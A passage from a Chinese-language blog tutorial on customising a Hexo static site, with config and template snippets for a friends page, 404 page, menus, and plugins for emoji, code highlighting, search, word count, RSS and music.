<p>然后在博客 source 目录下新建 _data 目录，在 _data 目录中新建 friends.json 文件，文件内容如下所示：</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
        <span class="token string">"avatar"</span><span class="token punctuation">:</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/csdn.png"</span><span class="token punctuation">,</span>
        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Blog"</span><span class="token punctuation">,</span>
        <span class="token string">"introduction"</span><span class="token punctuation">:</span> <span class="token string">"CSDN社区"</span><span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://blog.csdn.net/guixinchn"</span><span class="token punctuation">,</span>
        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"CSDN"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token punctuation">{</span>
        <span class="token string">"avatar"</span><span class="token punctuation">:</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/bokeyuan.png"</span><span class="token punctuation">,</span>
        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Blog"</span><span class="token punctuation">,</span>
        <span class="token string">"introduction"</span><span class="token punctuation">:</span> <span class="token string">"博客园"</span><span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://www.cnblogs.com/guixinchn/"</span><span class="token punctuation">,</span>
        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"博客园"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token punctuation">{</span>
        <span class="token string">"avatar"</span><span class="token punctuation">:</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/github.png"</span><span class="token punctuation">,</span>
        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"github"</span><span class="token punctuation">,</span>
        <span class="token string">"introduction"</span><span class="token punctuation">:</span> <span class="token string">"github"</span><span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://github.com/guixinchn"</span><span class="token punctuation">,</span>
        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"github"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token punctuation">{</span>
        <span class="token string">"avatar"</span><span class="token punctuation">:</span> <span class="token string">"https://cdn.jsdelivr.net/gh/guixinchn/image/blog/touxiang.jpg"</span><span class="token punctuation">,</span>
        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Blog"</span><span class="token punctuation">,</span>
        <span class="token string">"introduction"</span><span class="token punctuation">:</span> <span class="token string">"咕咕星"</span><span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://ythan.top"</span><span class="token punctuation">,</span>
        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">"咕咕星"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="6、添加-404-页面"><a href="#6、添加-404-页面" class="headerlink" title="6、添加 404 页面"></a>6、添加 404 页面</h4><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20200821174825.png" alt="img"></p>
<p>首先再站点根目录下的 source 文件夹下新建 404.md 文件，里面内容如下：</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: 404
date: 2020-02-23 19:37:07
type: "404"
layout: "404"
description: "Oops～，我崩溃了！找不到你想要的页面了"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>紧接着再新建主题文件夹的 layout 目录下新建 404.ejs 文件，添加内容如下：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">
    <span class="token comment" spellcheck="true">/* don't remove. */</span>
    <span class="token selector"><span class="token class">.about-cover</span> </span><span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">90.2</span>vh<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bg-cover pd-header about-cover<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s10 offset-s1 m8 offset-m2 l8 offset-l2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        404
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        &lt;%= page.description %>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token comment" spellcheck="true">// 每天切换 banner 图.  Switch banner image every day.</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="7、添加自定义页面"><a href="#7、添加自定义页面" class="headerlink" title="7、添加自定义页面"></a>7、添加自定义页面</h4><p>首先在站点目录下的 source 文件夹下新建 aboutme 文件，文件名可自定义，然后编写一个 index.html 放入 aboutme 文件夹下，然后在主题配置文件下的导航配置信息添加下面的配置：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">About</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>card
    <span class="token key atrule">children</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> 关于我
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /about
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Another    <span class="token comment" spellcheck="true">#这是新添加的，在原有配置基础上添加</span>
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /aboutme
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fa fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>secret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后在站点配置文件下，找到 skip_render，在后面添加属性，如下：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 其意思为在对文件进行渲染时跳过aboutme文件下的所有文件</span>
<span class="token key atrule">skip_render</span><span class="token punctuation">:</span> 
    <span class="token punctuation">-</span> aboutme/** 
    <span class="token punctuation">-</span> aaa/**
    <span class="token punctuation">-</span> bbb/**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="配置菜单导航"><a href="#配置菜单导航" class="headerlink" title="配置菜单导航"></a>配置菜单导航</h4><p>配置基本菜单导航的名称、路径 url 和图标 icon.</p>
<p>图标 icon 可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中查找</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># main menu navigation url and icon</span>
<span class="token comment" spellcheck="true"># 配置菜单导航的名称、路径和图标icon.</span>
<span class="token key atrule">menu</span><span class="token punctuation">:</span>
  <span class="token key atrule">Index</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home
  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags
  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark
  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive
  <span class="token key atrule">About</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle
  <span class="token key atrule">Contact</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /contact
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>comments
  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h5><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作<br>1.在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)<br>2.在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.<br>3.注意每个二级菜单模块前要加 <code>-</code>.<br>4.注意缩进格式</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>
  <span class="token key atrule">Index</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home
  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags
  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark
  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive
  <span class="token key atrule">About</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle<span class="token punctuation">-</span>o
  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book
  <span class="token key atrule">Medias</span><span class="token punctuation">:</span>
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list
    <span class="token key atrule">children</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Musics
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /musics
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>music
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Movies
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Books
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /books
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book
      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Galleries
        <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries
        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="添加-emoji-表情支持"><a href="#添加-emoji-表情支持" class="headerlink" title="添加 emoji 表情支持"></a>添加 emoji 表情支持</h3><p>需要安装插件 hexo-filter-github-emojis</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>没成功</strong></p>
<p>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji
  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">styles</span><span class="token punctuation">:</span>
  customEmojis<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>😍 😄 😂 ✨ 🎵 👌 👍 💜<br>👫 💧 ☀ 🐼 🐦 🌚 🌏 📞 🔫 🔭 🚴 🍅 🚀 🇨🇳 🈚 🈳 🚯 ♎ ©。<strong>来一波表情支持</strong></p>
<p>在网站<a href="https://www.webfx.com/tools/emoji-cheat-sheet/可以搜索常用表情对应代码">https://www.webfx.com/tools/emoji-cheat-sheet/可以搜索常用表情对应代码</a></p>
<p>在 <a href="https://www.webpagefx.com/tools/emoji-cheat-sheet/">emoji-cheat-sheet</a> 中找到你想要的表情，然后点击即可复制。使用方法和 <a href="https://github.com/">GitHub</a> 一样，比如你想发一个笑脸 😄 直接输入笑脸对应的 emoji 编码 <code>:smile：</code> 就可以。</p>
<h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>原本的代码显示行号和内容分开了，不美观</p>
<p>代码美化需要安装hexo-prism-plugin 插件</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">highlight</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#代码块的设置</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false            </span><span class="token comment" spellcheck="true">#开启代码块高亮</span>
  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">true        </span><span class="token comment" spellcheck="true">#如果未指定语言，则启用自动检测</span>
  <span class="token key atrule">auto_detect</span><span class="token punctuation">:</span> <span class="token boolean important">false        </span><span class="token comment" spellcheck="true">#显示行数</span>
  <span class="token key atrule">tab_replace</span><span class="token punctuation">:</span> <span class="token string">''</span>        <span class="token comment" spellcheck="true">#用n个空格替换tabs；如果值为空，则不会替换tabs</span>
  <span class="token key atrule">wrap</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">hljs</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>


<span class="token comment" spellcheck="true"># 关闭原有的代码高亮，使用自己的</span>
<span class="token key atrule">prism_plugin</span><span class="token punctuation">:</span>
  <span class="token key atrule">mode</span><span class="token punctuation">:</span> <span class="token string">'preprocess'</span>    <span class="token comment" spellcheck="true"># realtime/preprocess</span>
  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'tomorrow'</span>
  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">false    </span><span class="token comment" spellcheck="true"># default false</span>
  custom_css<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th align="center"><strong>参数KEY</strong></th>
<th align="center"><strong>可选值</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">mode</td>
<td align="center">realtime (Parse code on browser in real time) preprocess (Preprocess code in node)</td>
</tr>
<tr>
<td align="center">theme</td>
<td align="center">default coy dark funky okaidia solarizedlight tomorrow twilight 如果要更多的选择访问： <a href="https://github.com/ele828/hexo-prism-plugin">hexo-prism-plugin</a></td>
</tr>
<tr>
<td align="center">line_number</td>
<td align="center">true (Show line numbers) false (Default, Hide line numbers)</td>
</tr>
<tr>
<td align="center">no_assets</td>
<td align="center">true (Stop loading asset files) false (Default, load script and stylesheets files)</td>
</tr>
</tbody></table>
<p><strong>注意：</strong></p>
<p>hexo花括号显示失败的话，需要将hexo版本降级，改成hexo4.2.0版本就好了</p>
<p>卸载hexo5.0<br><code>npm uninstall hexo --save</code></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20200821010640.png" alt="img"></p>
<p>安装4.2.0版本</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo@4.2.0 --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20200821010658.png" alt="img"></p>
<h3 id="主题的搜索功能"><a href="#主题的搜索功能" class="headerlink" title="主题的搜索功能"></a>主题的搜索功能</h3><p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210119204534310.png" alt="image-20210119204534310"></p>
<p>需要安装hexo-generator-search插件</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>
  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml
  <span class="token key atrule">field</span><span class="token punctuation">:</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="文章字数统计插件"><a href="#文章字数统计插件" class="headerlink" title="文章字数统计插件"></a>文章字数统计插件</h3><p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210119204355226.png" alt="image-20210119204355226"></p>
<p>需要安装 hexo-wordcount 插件</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>主题下的 _config.yml 文件中，激活以下配置项即可：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">wordCount</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 将这个值设置为 true 即可.</span>
  <span class="token key atrule">postWordCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>保存后报错</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210117140326262.png" alt="image-20210117140326262"></p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">ls</span> --depth 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>命令查看 npm 安装各 hexo 插件的情况</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210117142653510.png" alt="image-20210117142653510"></p>
<p>无问题，改为以下不报错</p>
<p>一天后问题自动恢复</p>
<h3 id="添加-RSS-订阅支持"><a href="#添加-RSS-订阅支持" class="headerlink" title="添加 RSS 订阅支持"></a>添加 RSS 订阅支持</h3><p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210120134517461.png" alt="image-20210120134517461"></p>
<p>需要安装hexo-generator-feed插件</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>
  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom
  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml
  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>
  <span class="token key atrule">hub</span><span class="token punctuation">:</span>
  <span class="token key atrule">content</span><span class="token punctuation">:</span>
  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>
  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>
  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 public 文件夹中即可看到 atom.xml 文件，则已经安装成功</p>
<h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 /layout/_partial/footer.ejs 文件中，包括站点、使用的主题、访问量等。</p>
<h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 config.yml 文件中，默认支持 QQ、GitHub 和邮箱等的配置，你可以在主题文件的 /layout/_partial/social-link.ejs 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.github)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.github %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 source/medias/reward 文件中修改</p>
<h3 id="配置音乐播放器"><a href="#配置音乐播放器" class="headerlink" title="配置音乐播放器"></a>配置音乐播放器</h3><p><img src="https://gitee.com/marmalade0/images/raw/master/img/image-20210121162930869.png" alt="image-20210121162930869"></p>
<p>支持接入第三方音乐，如 QQ 音乐，网易云音乐，酷狗音乐等等</p>
<p>主题的 _config.yml 配置文件中激活 music 配置即可：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Whether to display the musics.</span>
<span class="token comment" spellcheck="true"># 是否在首页显示音乐.</span>
<span class="token key atrule">music</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#非吸底模式有效</span>
    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">show</span><span class="token punctuation">:</span> 咕咕星的歌单
  <span class="token key atrule">autoHide</span><span class="token punctuation">:</span> <span class="token boolean important">true    </span><span class="token comment" spellcheck="true"># hide automaticaly</span>
